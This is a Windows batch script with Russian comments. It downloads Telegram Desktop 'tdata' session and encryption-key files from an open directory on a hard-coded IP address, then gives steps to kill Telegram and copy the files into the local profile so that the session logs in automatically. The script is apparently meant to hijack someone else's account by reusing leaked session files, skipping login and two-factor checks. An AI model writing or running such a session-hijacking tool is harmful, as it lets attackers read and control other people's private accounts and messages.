@echo off
REM Скачивание tdata для Telegram Desktop с открытого директория
REM Хост: 222.109.84.79:8000
REM Папка: Telegram/tdata/

set "REMOTE_URL=http://222.109.84.79:8000/Telegram/tdata"
set "LOCAL_DIR=%~dp0telegram_tdata_download"
set "TG_PROFILE=%APPDATA%\Telegram Desktop"

echo ============================================
echo  Telegram tdata Downloader
echo  Source: %REMOTE_URL%/
echo ============================================
echo.

REM Создаём локальную папку для загрузки
if not exist "%LOCAL_DIR%" mkdir "%LOCAL_DIR%"

REM 1. Проверяем доступность хоста
echo [1/5] Проверка соединения с хостом...
curl -s --connect-timeout 3 "%REMOTE_URL%/" > nul 2>&1
if %errorlevel% neq 0 (
    echo   ОШИБКА: не удалось подключиться к %REMOTE_URL%
    echo   Проверьте интернет-соединение и доступность хоста.
    pause
    exit /b 1
)
echo   OK - хост доступен.
echo.

REM 2. Скачиваем ключевые файлы по отдельности (т.к. wget в Windows может таймаутиться)
echo [2/5] Скачивание ключевых файлов tdata...

REM Главный файл сессии (488KB)
echo   -> F78D8EB9EA67B6C6s
curl -s --connect-timeout 5 --max-time 30 -o "%LOCAL_DIR%\F78D8EB9EA67B6C6s" "%REMOTE_URL%/F78D8EB9EA67B6C6s"
if %errorlevel% neq 0 (
    echo   ПРЕДУПРЕЖДЕНИЕ: не удалось скачать F78D8EB9EA67B6C6s
) else (
    for %%A in ("%LOCAL_DIR%\F78D8EB9EA67B6C6s") do echo      размер: %%~zA байт
)

REM Файл сессии
echo   -> D877F783D5D3EF8Cs
curl -s --connect-timeout 5 --max-time 10 -o "%LOCAL_DIR%\D877F783D5D3EF8Cs" "%REMOTE_URL%/D877F783D5D3EF8Cs"
if %errorlevel% neq 0 (
    echo   ПРЕДУПРЕЖДЕНИЕ: не удалось скачать D877F783D5D3EF8Cs
) else (
    for %%A in ("%LOCAL_DIR%\D877F783D5D3EF8Cs") do echo      размер: %%~zA байт
)

REM Ключ шифрования
echo   -> key_datas
curl -s --connect-timeout 5 --max-time 10 -o "%LOCAL_DIR%\key_datas" "%REMOTE_URL%/key_datas"
if %errorlevel% neq 0 (
    echo   ПРЕДУПРЕЖДЕНИЕ: не удалось скачать key_datas
) else (
    for %%A in ("%LOCAL_DIR%\key_datas") do echo      размер: %%~zA байт
)

REM Настройки клиента
echo   -> settingss
curl -s --connect-timeout 5 --max-time 10 -o "%LOCAL_DIR%\settingss" "%REMOTE_URL%/settingss"
if %errorlevel% neq 0 (
    echo   ПРЕДУПРЕЖДЕНИЕ: не удалось скачать settingss
) else (
    for %%A in ("%LOCAL_DIR%\settingss") do echo      размер: %%~zA байт
)

REM Временная сессия
echo   -> 6F2C9B2FE6761967s
curl -s --connect-timeout 5 --max-time 10 -o "%LOCAL_DIR%\6F2C9B2FE6761967s" "%REMOTE_URL%/6F2C9B2FE6761967s"
if %errorlevel% neq 0 (
    echo   ПРЕДУПРЕЖДЕНИЕ: не удалось скачать 6F2C9B2FE6761967s
) else (
    for %%A in ("%LOCAL_DIR%\6F2C9B2FE6761967s") do echo      размер: %%~zA байт
)

REM Префикс и тег пользователя
echo   -> prefix
curl -s --connect-timeout 5 --max-time 10 -o "%LOCAL_DIR%\prefix" "%REMOTE_URL%/prefix"
echo   -> usertag
curl -s --connect-timeout 5 --max-time 10 -o "%LOCAL_DIR%\usertag" "%REMOTE_URL%/usertag"

REM countries (может быть пустым)
echo   -> countries
curl -s --connect-timeout 5 --max-time 10 -o "%LOCAL_DIR%\countries" "%REMOTE_URL%/countries"

REM desktop.ini
echo   -> desktop.ini
curl -s --connect-timeout 5 --max-time 10 -o "%LOCAL_DIR%\desktop.ini" "%REMOTE_URL%/desktop.ini"

echo   Готово.
echo.

REM 3. Подсчёт загруженных файлов
echo [3/5] Статистика загрузки:
set /a file_count=0
for %%F in ("%LOCAL_DIR%\*") do set /a file_count+=1
echo   Всего файлов скачано: %file_count%
echo   Размер папки:
for /f "tokens=*" %%S in ('dir "%LOCAL_DIR%" /-c ^| find "File(s)"') do echo   %%S
echo.

REM 4. Проверка профиля Telegram
echo [4/5] Проверка профиля Telegram Desktop...
if exist "%TG_PROFILE%" (
    echo   Профиль найден: %TG_PROFILE%
    if exist "%TG_PROFILE%\tdata" (
        echo   Папка tdata уже существует.
    )
) else (
    echo   ПРЕДУПРЕЖДЕНИЕ: Telegram Desktop не установлен или профиль не найден.
    echo   Путь: %TG_PROFILE%
    echo   Установите Telegram Desktop, запустите его один раз, затем запустите этот скрипт снова.
)
echo.

REM 5. Инструкция по установке
echo [5/5] Инструкция по использованию:
echo.
echo   1. ЗАКРОЙТЕ Telegram Desktop полностью:
echo      taskkill /f /im Telegram.exe
echo.
echo   2. СКОПИРУЙТЕ файлы в профиль Telegram:
echo      xcopy /Y "%LOCAL_DIR%\*" "%APPDATA%\Telegram Desktop\tdata\"
echo.
echo   3. ЗАПУСТИТЕ Telegram Desktop:
echo      start telegram
echo.
echo   4. Сессия подключится автоматически — аккаунт будет авторизован.
echo.
echo   Локальная папка с tdata: %LOCAL_DIR%
echo.
echo   ============================================
echo   Готово! Сессия скачана.
echo   ============================================

pause